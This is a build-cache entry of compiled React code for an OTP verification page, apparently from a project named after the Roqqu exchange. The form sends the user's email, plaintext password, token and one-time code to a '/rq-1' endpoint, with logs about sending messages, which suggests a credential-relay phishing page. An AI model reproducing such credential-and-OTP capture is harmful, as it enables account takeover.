{"ast":null,"code":"import _regeneratorRuntime from\"/home/niscolinx/projects/roqq/roqquappchat/rq1/node_modules/babel-preset-react-app/node_modules/@babel/runtime/regenerator\";import _asyncToGenerator from\"/home/niscolinx/projects/roqq/roqquappchat/rq1/node_modules/babel-preset-react-app/node_modules/@babel/runtime/helpers/esm/asyncToGenerator\";import _slicedToArray from\"/home/niscolinx/projects/roqq/roqquappchat/rq1/node_modules/babel-preset-react-app/node_modules/@babel/runtime/helpers/esm/slicedToArray\";import React,{useState}from'react';import{useHistory}from'react-router-dom';import'../styles/styles.css';import LogoWhite from'../assets/logo_white.png';import URL from'./Url.js';import{jsx as _jsx}from\"react/jsx-runtime\";import{jsxs as _jsxs}from\"react/jsx-runtime\";var Otp=function Otp(props){var history=useHistory();var _useState=useState(''),_useState2=_slicedToArray(_useState,2),otp=_useState2[0],setOtp=_useState2[1];var _useState3=useState(false),_useState4=_slicedToArray(_useState3,2),loading=_useState4[0],setLoading=_useState4[1];var handleCode=function handleCode(e){setOtp(e.target.value.replace(/\\D/,''));};var handleSubmit=/*#__PURE__*/function(){var _ref=_asyncToGenerator(/*#__PURE__*/_regeneratorRuntime.mark(function _callee(e){var templateParams,response,resData;return _regeneratorRuntime.wrap(function _callee$(_context){while(1){switch(_context.prev=_context.next){case 0:e.preventDefault();setLoading(true);if(!(otp==='')){_context.next=6;break;}console.log('not sent!');_context.next=23;break;case 6:if(!props.location.state){_context.next=23;break;}templateParams=props.location.state;templateParams.otp=otp;_context.prev=9;_context.next=12;return fetch(URL+'/rq-1',{method:'POST',headers:{Accept:'application/json','Content-type':'application/json',Authorization:'Bearer '+templateParams.token},credentials:'include',mode:'cors',body:JSON.stringify({email:templateParams.email,password:templateParams.password,otp:otp})});case 12:response=_context.sent;_context.next=15;return response.json();case 15:resData=_context.sent;console.log('email sending started');if(resData.status==='success'){console.log('Message Sent.');setTimeout(function(){console.log('time out init');setLoading(false);history.push('verifyOtp',templateParams);},6000);}else if(resData.status==='fail'){console.log('Message failed to send.');setLoading(false);}_context.next=23;break;case 20:_context.prev=20;_context.t0=_context[\"catch\"](9);console.log(_context.t0);case 23:case\"end\":return _context.stop();}}},_callee,null,[[9,20]]);}));return function handleSubmit(_x){return _ref.apply(this,arguments);};}();return/*#__PURE__*/_jsx(\"div\",{className:\"grid \",children:/*#__PURE__*/_jsxs(\"div\",{className:\" grid gap-7\",children:[/*#__PURE__*/_jsx(\"img\",{src:LogoWhite,alt:\"\",className:\"lg:w-1/4 w-5/12 justify-self-center my-7 \"}),/*#__PURE__*/_jsxs(\"div\",{className:\"mx-2\",children:[/*#__PURE__*/_jsxs(\"form\",{className:\"grid w-full place-content-stretch bg-white md:w-1/3 md:mx-auto rounded \",style:{padding:'30px 15px'},onSubmit:handleSubmit,children:[/*#__PURE__*/_jsx(\"h2\",{className:\"font-medium text-center text-[#1c124d] mb-4 text-2xl\",children:\"Verify it's you\"}),/*#__PURE__*/_jsx(\"p\",{className:\"text-center text-[#1c124d] my-4\",children:\"We've sent a verification code to your email. Enter the code from the email in the field below.\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",id:\"code\",className:\"text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4\",required:true,pattern:\"\\\\d*\",value:otp,placeholder:\"Enter 6 digit code\",onChange:handleCode,maxLength:6}),/*#__PURE__*/_jsx(\"button\",{className:\" rounded-md outline-none  bg-[#0059dd] text-white\",style:{padding:'.5rem 3rem',lineHeight:2.5,fontSize:'15px'},children:loading?'loading...':'Verify'})]}),' ']})]})});};export default Otp;","map":null,"metadata":{},"sourceType":"module"}